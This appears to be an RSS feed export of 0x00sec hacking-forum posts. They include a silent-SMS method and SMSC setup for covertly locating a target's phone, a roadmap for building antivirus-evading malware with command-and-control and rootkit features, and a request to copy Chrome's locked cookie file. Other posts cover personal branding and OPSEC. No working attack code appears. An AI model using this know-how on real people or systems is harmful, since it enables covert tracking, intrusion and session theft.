<p><strong>The header file</strong> <strong><strong>sys/stat.h</strong></strong> <strong>defines the structure of the data returned by the functions fstat, lstat, and stat, such as device ID, file serial number, mode, link count, user ID, group ID, and more. It also provides file type macros and symbolic name definitions for the mode bits and file size fields.</strong></p>
<p><strong>#include&lt;sys/types.h&gt;</strong></p>
<p><strong>T</strong> <strong>his</strong> <strong>header file defines the types and functions for the POSIX standard, with GNU Gnulib, a library for porting C and C++ applications to various platform.</strong></p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-lecture-1a/38788">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-lecture-1a/38788</link>
          <pubDate>Tue, 16 Jan 2024 21:54:10 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38788</guid>
          <source url="https://0x00sec.org/t/malware-development-lecture-1a/38788.rss">Malware development lecture 1A</source>
        </item>
        <item>
          <title>FIsher Price “My First SS7 attack”</title>
          <dc:creator><![CDATA[d8rh8r]]></dc:creator>
          <category>Phone Hacking</category>
          <description><![CDATA[
            <h1><a name="fisher-price-my-first-ss7-attack-1" class="anchor" href="https://0x00sec.org#fisher-price-my-first-ss7-attack-1"></a>FIsher Price “My First SS7 attack”</h1>
<p>I got a pm today asking me if I had “fully figured out and gained access to SS7 ?” Sadly the answer to parts A and B of that question is no, but I could have, I think.  After much searching &amp; scanning, I stumbled across a SGFW running default creds.<br>
Winner johnny… Full card…</p>
<p><em>I followed the guide here</em>: <a href="https://0x00sec.org/t/into-the-wild-gaining-access-to-ss7-part-1-finding-an-access-point/12418/66">best ss7 post ever</a></p>
<p>Unfortunately, to log in would have been crossing a line I’m not interested in crossing right now, so its treasures will remain a mystery.  Fortunately, I have less illegal way to get my SS7 fix.</p>
<p>My whole interest in SS7 is location data.  I don’t want to intercept password resets or OTP, I just want to be able to know the location of my POI.  Turns out there is an easier way than an AnytimeInterrogation attack to get that data.  My friends, let me introduce:</p>
<p><span alt="" role="presentation" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use href="#unlink"></use></svg></span></p>
<h2><a name="sms-type-0-2" class="anchor" href="https://0x00sec.org#sms-type-0-2"></a><strong>SMS Type 0</strong></h2>
<p>Originally, it was intended for specific tasks such as debugging or updating software on a mobile device without disturbing the user.  Turns out it’s pretty handy for getting location data too. Silent SMS for the win.  Here’s how it works.</p>
<p>A silent SMS is delivered to the target phone. This SMS, like all others, passes through the signaling system of the mobile network. When the SMS reaches its intended recipient, the phone automatically notifies the network that it has arrived, even though it does not sound an alert or appear in the recipient’s message list. Lucky us, this is a standard message delivery feature of the GSM protocol.</p>
<p>Information about the cell tower the message was routed through is included in the network’s response to this silent SMS. This can contain information that is essential for determining the precise location of the mobile device, such as the cell ID and location area code (LAC).</p>
<p>The device’s approximate location can be ascertained by examining the cell tower that was utilised to transmit the message. <a href="http://opencellid.org/" rel="noopener nofollow ugc">OpenCellid.org</a> is great for this, as is <a href="http://maprad.io/" rel="noopener nofollow ugc">maprad.io</a>.</p>
<p>How are we going to send our silent SMS? With our very own SMSC.</p>
<h2><a name="part-1-setting-up-the-server-3" class="anchor" href="https://0x00sec.org#part-1-setting-up-the-server-3"></a>Part 1. Setting up the server</h2>
<p><strong>Kannel</strong> is a powerful and widely used open source SMSC that supports various communication protocols including SMPP, HTTP, and UDP. I chose this option as it is actively maintained by a community of great developers and I just dig the vibe of the site.  A momentary flash of an internet gone by. Ok lets rumble.</p>
<ol>
<li>
<p>You can find the latest version on the Kannel website at <strong><a href="http://www.kannel.org/download.shtml" rel="noopener nofollow ugc">http://www.kannel.org/download.shtml</a></strong>.</p>
</li>
<li>
<p><strong>Getting Kannel:</strong><br>
The daily snapshots are what you are looking for.  Grab yourself some documentation while you at it, will probably come in handy.</p>
</li>
<li>
<p><strong>Step-by-Step Guide to Getting It Up and Running:</strong></p>
<ul>
<li><strong>Install Dependencies:</strong>
<ul>
<li>
<p>Ensure you have the necessary build tools and libraries installed. On a Debian-based system, you might need to run:</p>
<pre><code class="lang-bash">sudo apt-get install build-essential libssl-dev libcurl4-openssl-dev libdbi-dev libpcre3-dev libspeex-dev libspeexdsp-dev libgsm1-dev libasound2-dev libusb-dev libsctp-dev libqmi-dev libgps-dev libgoogle-glog-dev libopencv-dev libgcrypt20-dev libgnutls28-dev libmysqlclient-dev libpq-dev libradcli-dev libsctp-dev libspandsp-dev libtalloc-dev libvorbis-dev libxslt1-dev libyaml-dev portaudio19-dev python-dev python-pip python-setuptools python-twisted-bin python-zope.interface swig unixodbc-dev
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Navigate to the Kannel directory:</strong></p>
<ul>
<li>Extract you code to /kannel and cd in…</li>
</ul>
<pre><code class="lang-bash">mkdir kannel
cd kannel
wget https://www.kannel.org/download/kannel-snapshot.tar.gz
chmod +x kannel-snaphot.tar.gz
tar -xzvf kannel-snaphot.tar.gz
</code></pre>
</li>
<li>
<p><strong>Run the configure script:</strong></p>
<ul>
<li>Run the <strong><code>./configure</code></strong> script to start the configuration process.</li>
</ul>
<pre><code class="lang-bash">./configure
</code></pre>
</li>
<li>
<p><strong>Choose the options for your system:</strong></p>
<ul>
<li>
<p>The <strong><code>./configure</code></strong> script will prompt you to choose options for your system. Here are some common options:</p>
</li>
<li>
<p><strong>Adding MySQL support:</strong></p>
<pre><code class="lang-bash">--with-mysql=/usr/local/mysql
</code></pre>
</li>
<li>
<p><strong>Adding PostgreSQL support:</strong></p>
<pre><code class="lang-bash">--with-postgresql=/usr/local/pgsql
</code></pre>
</li>
<li>
<p><strong>Enabling SSL support:</strong></p>
<pre><code class="lang-bash">--enable-ssl
</code></pre>
</li>
<li>
<p><strong>Enabling shared libraries:</strong></p>
<pre><code class="lang-bash">--enable-shared
</code></pre>
</li>
<li>
<p><strong>Enabling debugging:</strong></p>
<pre><code class="lang-bash">--enable-debug
</code></pre>
</li>
<li>
<p><strong>Adding a prefix for installation:</strong></p>
<pre><code class="lang-bash">--prefix=/usr/local/kannel
</code></pre>
</li>
<li>
<p>You can also see all the options by running <strong><code>./configure --help</code></strong>.</p>
</li>
</ul>
</li>
<li>
<p><strong>Continue with the configuration process:</strong></p>
<ul>
<li>After setting the options, the script will continue to run and check for dependencies and other configurations.</li>
</ul>
</li>
<li>
<p><strong>Compile Kannel:</strong></p>
<ul>
<li>After configuring Kannel, you can compile it by running <strong><code>make</code></strong>.</li>
</ul>
</li>
<li>
<p><strong>Install Kannel:</strong></p>
<ul>
<li>Install Kannel by running <strong><code>sudo make install</code></strong>.</li>
</ul>
</li>
<li>
<p><strong>Configure Kannel Daemon:</strong></p>
<ul>
<li>Edit the <strong><code>/etc/kannel/kannel.conf</code></strong> file to configure the SMSC settings.</li>
</ul>
</li>
<li>
<p><strong>Start the Kannel Daemon:</strong></p>
<ul>
<li>Run <strong><code>sudo kannel start</code></strong> to start the Kannel daemon.</li>
</ul>
</li>
<li>
<p><strong>Test the SMSC:</strong></p>
</li>
</ol>
<ul>
<li>Use the <strong><code>sendsms</code></strong> or <strong><code>bearerbox</code></strong> command to test the SMSC.</li>
</ul>
<p>Please note that the actual options and configurations may vary depending on your system and the features you need. Refer to the Kannel documentation for the most up-to-date information.</p>
<p>In our next installment… setting up our SMS gateway &amp; the moneyshot…  See you then.</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731</link>
          <pubDate>Fri, 12 Jan 2024 14:57:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38731</guid>
          <source url="https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731.rss">FIsher Price “My First SS7 attack”</source>
        </item>
        <item>
          <title>Personal branding for IT pros</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Wiki</category>
          <description><![CDATA[
            <p>This a bit different but totally important in our professional life</p><p><a href="https://www.youtube.com/watch?v=wzThY4TiWdw">personal branding for IT pros</a></p>

<p>PERSONAL BRANDING FOR IT Pros<br>
What is Personal Branding? Personal Branding is a technique that people<br>
practice to market themselves (self-promotion) and their careers as brands<br>
Or<br>
Personal branding is defined as “a fully planned and strategic process<br>
developing action to promote your own brand.<br>
Or<br>
It is a creative and unique way to communicate what makes you special and<br>
distinct.<br>
Note: Today in a highly competitive world, personal branding is an<br>
important tool to success irrespective of the profession.<br>
It is possible only when we understand our creative ideas and unique<br>
attributes including our skill sets, values, strengths, and passions and use<br>
them to stand out of the crowd.</p>
<p>IMPORTANCE OF PERSONAL BRANDING</p>
<p>Popularity − Develop your visibility and popularity.<br>
Confidence − Build your confidence.<br>
Status − Stronghold your position in the society.<br>
Determination − Enhance your focus on your business.<br>
Development − Expand your business area/s.<br>
Identity − Increase your earning and fame.<br>
Reputation − Develop your credibility and reliability in the market.<br>
Self-fulfillment − Attain your ultimate goal.<br>
When you groom your profession with personal branding, it helps you build a<br>
strategy. Likewise, it adds unforgettable value to your profession.</p>
<p>IDENTIFYING YOUR BRAND</p>
<p>To setup ones brand, Identification of things you like, choices, and wishes is the most<br>
difficult part.<br>
As such there is no foolproof way to discover setup your brand.<br>
The following a the questions we have to ask our selves in the due process<br>
What is your qualification?<br>
What is your area of interest?<br>
What do you want to achieve?<br>
What is your passion?<br>
How are you currently perceived?<br>
How are you perceived in your personal and professional relationships?<br>
What is your industry/sector?<br>
What is the market and target audience for your brand?<br>
What is your niche?After the above do the following</p>
<ol>
<li>Write down five things that you like most;<br>
2 .Write down five points for which you are appreciated more often by the people<br>
around you.<br>
Try comparing all the above from 1 and 2 and find any that you need to improve<br>
while thinking about you and the peoples view point.<br>
Once you are done identifying your brand, now you need to −</li>
</ol>
<p>Set a goal.</p>
<p>Note down your mission, vision, and personal brand statement.<br>
Build a strategy that is small and in simple steps. Once you complete first only then<br>
move on to the second strategy and so on. A complicated strategy in the very first<br>
instance can discourage you, so avoid it, and choose a simple path).</p>
<p>How to Create Your Brand?</p>
<p>Thoughts and likeness, which will help you to personalize your brand vision. With the<br>
following steps, it will be easier for you to create your brand<br>
Step 1<br>
Note down your values − It could be anything that gives meaning to your life.<br>
Possibly, you are not aware of these values, but in most of your decisions, it plays a<br>
big role.<br>
For example, your value could be −<br>
Community (society)<br>
Work Intelligence (the work you can perform best)<br>
Hobbies (the work that more often you live to do)<br>
Ambition/Goal (the ultimate destination)<br>
However, this is not the conclusive list, it is just an example. If you correctly note<br>
down your values, it will definitely help you develop a successful personal branding<br>
strategy.</p>
<p>Step 2<br>
Prioritize your Values − After listing and categorizing your values, now you need to<br>
prioritize them. While prioritizing, take help of your interest, likeness, and even your<br>
passion. These will help you prioritize your values.<br>
Step 3<br>
Identify your Traits − Trait is the most unique feature of your personality. You might<br>
not notice, but most of your behavior is guided by your trait. Following are the five<br>
most important personality traits −<br>
Conscientiousness − It means, how careful or vigilant you are at your work.<br>
Openness to experience − It means, how open, creative, curious, liberal, aesthetic-<br>
minded you are.<br>
Extroversion − It means, you don’t like loneliness rather prefer to remain around<br>
people.<br>
Agreeableness − It means, how kind, sympathetic, warm, cooperative, and<br>
considerate you are.<br>
Neuroticism − It is a tendency to be in negative emotional state. Normally, this<br>
feature is usually discouraged; so, it is good to cure/suppress this kind of<br>
trait/symptom.<br>
Step 4<br>
Discuss your Plan with your partner and Friends− The last step is to discuss<br>
your plan and strategy with those who know and understand you very well.</p>
<p>SWOT Analysis</p>
<p>SWOT is a very effective exercise that is recommended to be done before creating<br>
your brand. It will definitely help you in revealing your real picture and accordingly<br>
you can create your brand.</p>
<p>Strengths − It is your internal characteristics that helps build competitive<br>
advantages. For example, good voice, eloquence, witty demeanor, etc.<br>
Weakness − Interospect yourself and try to find what are the weaknesses within you<br>
that might be potential hindrance in a career. For example, fear in public, not able to<br>
speak properly in front of people, etc.<br>
Opportunities − Opportunity is an external aspect for which you have to be vigilant;<br>
if you are not able to recognize it, definitely you are going to miss on something<br>
good. For example, opportunity of a job, opportunity to deal a project, etc…</p>
<p>Threats − It is also an external aspect of your life. Unfortunately, you cannot control<br>
your threat, but of course, you can address and mitigate them. For example, sudden<br>
rise of your competitor, inability to attend a very crucial meeting, etc.<br>
Some other important points that you need to consider are −<br>
List the people whom you admire<br>
Read their success stories<br>
Learn the lessons these people used for their success<br>
Based on these information, you can correct/improve your strategy.</p>
<p>Promoting your brand</p>
<p>its another big question that you need to seriously consider.<br>
follow the following steps −<br>
Step 1<br>
Consider Yourself as a Brand − Start considering yourself as a brand, it will give<br>
you confidence.<br>
Prepare Your Toolkit − Your profile, portfolio with pictures, messages, etc.<br>
Plan Your Strategy − Based on your toolkit, develop your strategy.<br>
Step 2<br>
Decide Your Medium of Promotion − which mediums you want to use for your<br>
branding. For example: Self promotions, events, print media, electronic media, etc.<br>
Make Your Online Presence − There are various social media websites such as<br>
Facebook, Twitter, LinkedIn, Google+, etc. where you can create your fascinating<br>
profile.<br>
Have a website built − A website with detailed portfolio is one of the best ways of<br>
personal branding. Google can easily crawl your name through your website.<br>
Update Your Website Regularly − Updating the website is another important<br>
aspect of self-branding. Articles and blog posting is the easiest tool that has potential<br>
enough to increase traffic on your website…<br>
Emailing − Draft a very nice, authentic, small, but clear message and email it to all<br>
those people who can be beneficial for you.<br>
Share Your Updates<br>
Join Online Forum − Join an online forum, which is linked to your profession.<br>
Find Out Your Target Audience − Discover people interested in your profession;<br>
connect with them online, if possible offline as well.<br>
Attend Events and Seminar − Attend all events and seminars of your interest,<br>
meet with different people, and give them your business card. It will greatly help<br>
improve your social networking.<br>
Organize Local Events − If your position is a little strong and you can afford an<br>
event; organize it. Select a nice theme, promote your event almost a month in<br>
advance through social media website as well as print media. It is unlimited and very<br>
effective source of personal branding.<br>
Select Your Clothing − Your personal style, sense of dressing, and body language<br>
are extremely important. Therefore, select the clothing that best represents you.<br>
Further, be courteous enough to convince others.</p>
<p>How to Get Free Media Attention?</p>
<p>Getting media’s attention can make you an apparent brand in your profession.<br>
Having your name published in a national newspaper/magazine and/or being<br>
aired on TV, can make you popular instantly. Grabbing people’s attention through<br>
media can definitely kick start your profession.<br>
But how to get free media attention is a big deal. The following tips though not<br>
foolproof may help you get free media attention −<br>
Step 1<br>
Research Topics of Relevance − First you need to research the relevant topics<br>
(related to your profession), which is the point of attraction for the media.<br>
Step 2<br>
Collect the Detailed Information − Once you come to know the topic in news,<br>
collect detailed information on the same…Step 3<br>
Publish online − Write a couple of articles and blogs on the same topic giving<br>
detailed information with references. Promote your write-up through social media<br>
websites.<br>
Step 4<br>
Collect List of Media − Make a list of TV channels who are covering news on the<br>
same topic. Write to all of them about your views on the same topic and substantiate<br>
yourself with a few reliable links. Discuss some points, those either ignored or no one<br>
paid attention to. Possible, many of them will ignore your email. But it is also possible<br>
some of them might pay attention.<br>
Being patient and waiting for a breakthrough is essential. Once you and your work is<br>
under the media radar, your growth will be exponential.</p>
<p>How to Monitor Your Brand?</p>
<p>This is that last and continuous step that you will often perform for the rest of your<br>
career<br>
Step 1<br>
Make Your Brand Name Distinct − Before naming your brand, you need to<br>
research thoroughly. You need to be sure that you are using a distinct name, which is<br>
not used by any other celebrity or big brand.<br>
Step 2<br>
Manage Your Brand on Search Engine − You need to manage i.e. how your name<br>
appears on search engines’ ranking.  Besides Google, you also need to manage your<br>
brand on other search engines, e.g.yandex, etc…<br>
Step 3<br>
Manage Your Brand on Social Media Websites − Keep your profile updated and<br>
compelling on Facebook, Google+, Twitter, LinkedIn, etc.<br>
Step 4<br>
Use video hosting platforms (YouTube) − if possible create youtube videos about<br>
your niche<br>
Step 5<br>
Stay updated − On top of this, always keep your eyes open and see what is<br>
happening around you. If something is related to your profession, acquaint yourself<br>
with it and keep updating your knowledge.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/personal-branding-for-it-pros/38671">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/personal-branding-for-it-pros/38671</link>
          <pubDate>Sun, 07 Jan 2024 22:58:25 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38671</guid>
          <source url="https://0x00sec.org/t/personal-branding-for-it-pros/38671.rss">Personal branding for IT pros</source>
        </item>
        <item>
          <title>Get inside of Viber Messenger</title>
          <dc:creator><![CDATA[d1sm4tch]]></dc:creator>
          <category>Reverse Engineering</category>
          <description><![CDATA[
            <p>Hi all! I need to make my own lightweight web client of that messenger Viber.<br>
So I need somehow get the way of client-server communication(auth, send message, receive message).<br>
I tried to decompile android apk with apktool but haven’t found anything useful.<br>
Also tried to intercept packages with Wireshark and get encrypted TLS with some hardcoded cert (I think so).<br>
Please, help me with ideas I can try!</p>
            <p><small>7 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/get-inside-of-viber-messenger/38612">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/get-inside-of-viber-messenger/38612</link>
          <pubDate>Thu, 04 Jan 2024 07:50:12 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38612</guid>
          <source url="https://0x00sec.org/t/get-inside-of-viber-messenger/38612.rss">Get inside of Viber Messenger</source>
        </item>
        <item>
          <title>Malware development from beginer to expert</title>
          <dc:creator><![CDATA[blc_chef]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Accompanying video on YouTube for this below lecture.   check now and please subscribe and like the video</p><p><a href="https://www.youtube.com/watch?v=T1xNKgkRpic">Malware development  lecture lessons roadmap</a></p>

<p>NOTE:    hey friends last year i quit my job, now am a full time freelancer and IT security teacher</p>
<p>This my take on malware development were we are going to develop from a prototype already out there to a something much more powerful</p>
<p>If you a cybersecurity professional, a pen tester, red teamer,having the skills to write undetectable malware is great and very rewarding.</p>
<p>Pros tend to use tools like metasploit, LordPE, shelter, veil, amitarge and others to accomplish given tasks but their is always a high possibility of getting caught by SOC team av solutions and that is not good.</p>
<p>Another reason to write your FUD malware from scratch is to eliminate the need for Metasploit, since it can handle only one connection at a time.  Whereas, during red teaming we always needed a CnC Server solution that can handle and control all the target machines together just like a botnet.</p>
<p>So in these series were are going to begin our journey of learning malware development at the same time applying software engineering principles, cryptography, forensics, networking and obfuscation from the basic principles to the most in the wild.</p>
<p>OUR ROAD MAP OUT OF ORDER</p>
<blockquote>
<p>Simple malware (prototype)<br>
Basics of software engineering<br>
Choosing a software methodology to follow<br>
Rewriting our malware from scratch<br>
digital forensics basics<br>
Basics of penetration testing<br>
Basics of red teaming<br>
Basics of cryptography<br>
window system programming<br>
Networking programming<br>
Driver and kernel programming<br>
Adding rootkit features to our product</p>
</blockquote>
<p>Shall add others to the mix as needed</p>
<p>Prerequisites<br>
Python programming skills (soon videos will be available)<br>
C/C++ programming skills</p>
<p>FUNCTIONALITY OF OUR PROTOTYPE</p>
<p>whoami function<br>
pwd function<br>
ls function<br>
move/ copy function<br>
delete file function<br>
download file function<br>
upload file function</p>
<p>one thing to avoid is  executing  most of the commands via command shell Win API, reason being that it becomes easier for endpoint monitoring tools to detect anomalies and find out that it’s a suspicious binary even though we can evade anti-virus software easily.</p>
<p>But  still we should  write this code, because you never know when you might need to execute shell commands or execute powershell/vbs/batch scripts remotely, and secondly, it is the easiest to start with as a beginner when learning malware development.</p>
            <p><small>9 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564</link>
          <pubDate>Mon, 01 Jan 2024 09:28:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38564</guid>
          <source url="https://0x00sec.org/t/malware-development-from-beginer-to-expert/38564.rss">Malware development from beginer to expert</source>
        </item>
        <item>
          <title>How can I rewrite this project using C#?</title>
          <dc:creator><![CDATA[pryoc110]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I want to implement a way to copy Chrome’s Cookies file to a specific directory, but the Cookies file will be occupied by Chrome making it impossible to copy it, I have learned that I can find the handles that occupy this file by traversing all the process handles and shutting them down so that I can copy the Cookies file without shutting down Chrome, but I only I found sample code written in C++, I tried to implement it in C#, but it didn’t close all handles successfully. How can I implement this C++ project completely using C#? Project address:<br>
<a href="https://www.dima.to/blog/how-to-enumerate-all-open-handles-for-all-processes-on-a-windows-machine/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.dima.to/blog/how-to-enumerate-all-open-handles-for-all-processes-on-a-windows-machine/</a><br>
<img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=12" title=":grinning:" class="emoji only-emoji" alt=":grinning:" loading="lazy" width="20" height="20"></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510</link>
          <pubDate>Wed, 27 Dec 2023 06:05:13 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38510</guid>
          <source url="https://0x00sec.org/t/how-can-i-rewrite-this-project-using-c/38510.rss">How can I rewrite this project using C#?</source>
        </item>
        <item>
          <title>Quantum programming CTFs</title>
          <dc:creator><![CDATA[Lorakai]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>I’m wondering if anyone here has any experience in quantum programming? An owner of a CTF site was wondering if it would be possible for me (using python and Qiskit) to program “something” capable of completing one of their CTF challenges. I was thinking maybe trying one of their crypto challenges, they were thinking maybe a programming challenge. Honestly don’t know if this type of thing is even possible. This isn’t a “fully functional” script, but it’s a simple example of some type of integration between Qiskit and Python<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72.jpeg" data-download-href="/uploads/short-url/fBLC4kji34AM9PA6hFL6rBL0MQa.jpeg?dl=1" title="Screenshot_20231214-202800" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_269x500.jpeg" alt="Screenshot_20231214-202800" data-base62-sha1="fBLC4kji34AM9PA6hFL6rBL0MQa" width="269" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_269x500.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_403x750.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d658cc9156bf9c92228c9f20746663ad1bcac72_2_538x1000.jpeg 2x" data-dominant-color="474746"></a></div><p></p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/quantum-programming-ctfs/38341">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/quantum-programming-ctfs/38341</link>
          <pubDate>Fri, 15 Dec 2023 01:15:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-38341</guid>
          <source url="https://0x00sec.org/t/quantum-programming-ctfs/38341.rss">Quantum programming CTFs</source>
        </item>
        <item>
          <title>An Overview of Operations security (OPSEC)</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Anonymity</category>
          <description><![CDATA[
            <p>Finally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OPSEC, or <code>OPERATIONS SECURITY</code>. For those who fancy a formal definition, OPSEC is the art of evaluating whether our moves are visible to potential threats, assessing the risk of compromising information, and then taking calculated measures to thwart those who seek to exploit our critical data.</p>
<p>Diving into the tactical realm, OPSEC emerged officially in 1966 during the US’s Operation Purple Dragon, spurred by the need to investigate operational mishaps and devise a pre-operation process to dodge fatal compromises. If you’re feeling historical, check it out here:  <a href="https://www.nsa.gov/portals/75/documents/news-features/declassified-documents/cryptologic-histories/purple_dragon.pdf" rel="noopener nofollow ugc">purple_dragon.pdf</a></p>
<h2><a name="core-principles-1" class="anchor" href="https://0x00sec.org#core-principles-1"></a>Core Principles</h2>
<p>In a nutshell, OPSEC boils down to one thing: control. Control over information and actions, to prevent any attempts at turning them against you. Whether you’re immersed in threat intelligence collection, a red team engagement, or just nosing around an investigation, OPSEC is the guardian angel watching over it all. While the textbooks swear by five sacred steps, we’re zooming in on a couple, starting with the core of <strong>Identifying and Analyzing Threats &amp;&amp; Vulnerabilities.</strong> Picture a process that unveils the adversary’s watchful gaze, details the information they crave, and pinpoints your Achilles’ heels. That’s just the kickoff. We then pivot to <strong>Assessing Risks</strong> and strategically applying <strong>Appropriate Countermeasures.</strong> Quick heads-up: I’m spinning this yarn with a big ol’ focus on Anonymity and Privacy.</p>
<p>Now, whether you’re a soldier, a civilian, or somewhere in the murky in-between, safeguarding your critical information is non-negotiable. This isn’t just a 9-to-5 deal it extends to your home. OPSEC isn’t just for the field; it’s your shield against personal info leaks and safeguarding sensitive details from turning into weapons against you. From PII and financial data to your daily grind, address, and personal records, OPSEC’s got your back. Stick around, and we’ll navigate the cyber, hopping between topics, unraveling my train of thought. By the time we wrap this up, it should all click into place.</p>
<h2><a name="identifying-and-analyzing-threats-vulnerabilities-2" class="anchor" href="https://0x00sec.org#identifying-and-analyzing-threats-vulnerabilities-2"></a>Identifying and Analyzing Threats &amp;&amp; Vulnerabilities</h2>
<p>Alright, let’s demystify the <strong>Identification of Critical Information.</strong> In plain speak, it’s about pinpointing what needs safeguarding to pull off the operation without a hitch. Be it your source IP address, the tools of the trade, or the intricate web of your command and control (C&amp;C) infrastructure – make it crystal clear. Enter CALI (Capabilities, Activities, Limitations, and Intentions), a straightforward checklist outlining the operation’s must-haves. But before I dive into the deep end and potentially befuddle you, let’s ease into it with a high-level overview and a dash of shenanigans.</p>
<p>Now, let’s get down to the internet. IP – the gateway to the online realm. Your connection to the internet is marked by an IP provided by your trusty ISP (Internet Service Provider), a key linked to an entry in their database. Most countries, ever-vigilant, have data retention regulations, forcing ISPs to log who’s using what IP when, for years on end. If that origin IP leaks, it’s a breadcrumb trail straight to you. Oh, and good luck accessing the internet in many places without coughing up some form of identification to your provider. <a href="https://en.wikipedia.org/wiki/IP_address" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/IP_address</a></p>
<p>Now, DNS. Standing for “Domain Name System,” it’s the wizard behind the curtain, helping your browser find the IP address of a service. Think of it as a colossal contact list – ask for a name, and it hands you the number. When your browser wants to visit, say, <code>0x00sec</code> via <a href="https://0x00sec.org/">0x00sec.org</a>, it ping-pongs with a DNS service to unveil the IP addresses of <code>0x00sec</code>’s servers.</p>
<p>Typically, your ISP dishes out the DNS service, automatically set up by the network you’re on. So, you type <code>0x00sec.com</code> into your browser, and the request embarks on an internet journey, hopping from DNS resolver to root nameserver to TLD server, and finally, to the domain’s nameserver. All this dance reveals the IP address of <code>0x00sec.com</code>, which then travels back to your browser, completing the ritual. For a deeper dive, check out: <a href="https://www.cloudflare.com/learning/dns/what-is-dns/" rel="noopener nofollow ugc">https://www.cloudflare.com/learning/dns/what-is-dns/</a></p>
<p>But here’s the kicker – most of these DNS requests cruise unencrypted. Even if you’re surfing in incognito mode, or HTTPS, your browser might be casually throwing unencrypted DNS requests out there, saying, “Hey, what’s the IP address of <a href="https://web.archive.org/web/20201121171632/http://www.pornhub.com/" rel="noopener nofollow ugc">www.pornhub.com</a>?”. Not exactly covert, right?</p>
<p>Now that we’ve paved the way and you’ve got the basics down, let’s talk about fortifying your privacy. Enter encrypted DNS, DNS over HTTPS or DNS over TLS. You can set up your private DNS server, self-hosted with something like pi-hole or remotely hosted with the likes of <strong>nextdns</strong> or the  <em>1.1.1.1</em> within the Tor network. Sounds like airtight privacy, right? Well, not entirely.</p>
<p>You can’t don the cloak of Tor all the time – it’s like shouting, “Hey, look at me!” and that’s not our game plan. To dodge unnecessary attention, we introduce VPNs and Tor, tag-teaming to keep your ISP and any nosy third party from eavesdropping or blocking your DNS requests. We’ll unpack this intricate dance in more detail down the road.</p>
